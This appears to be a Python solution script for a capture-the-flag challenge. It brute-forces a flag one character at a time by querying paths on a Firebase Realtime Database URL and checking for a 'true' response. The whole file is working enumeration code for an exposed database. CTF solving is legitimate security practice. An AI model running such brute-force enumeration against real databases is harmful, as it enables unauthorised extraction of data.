import requests
import string

# Base URL
base_url = "https://best-bathroom-default-rtdb.firebaseio.com/flag/"
suffix = ".json"
endpoint = "UDCTF"

# Characters to try: lowercase, uppercase, digits, and some symbols
characters_to_try = string.ascii_letters + string.digits + "'-_.{};!$%&*@"

def find_next_character(endpoint):
    for char in characters_to_try:
        # Append the character to the endpoint
        modified_endpoint = endpoint + char
        url = base_url + modified_endpoint + suffix

        response = requests.get(url)

        try:
            # If response is 'True' or any other specific condition you want
            if 'true' in response.text:
                return char
        except requests.exceptions.JSONDecodeError:
            # If the response isn't valid JSON, skip and continue
            continue
                
    return None

# Loop until a certain condition (for now, we'll limit to 10 iterations as an example)
for _ in range(70):  # Adjust this range as needed
    next_char = find_next_character(endpoint)
    if next_char:
        endpoint += next_char
        print(f"Found character '{next_char}'. Current endpoint: {endpoint}")
    else:
        print(f"No valid character found after '{endpoint}'. Exiting.")
        break
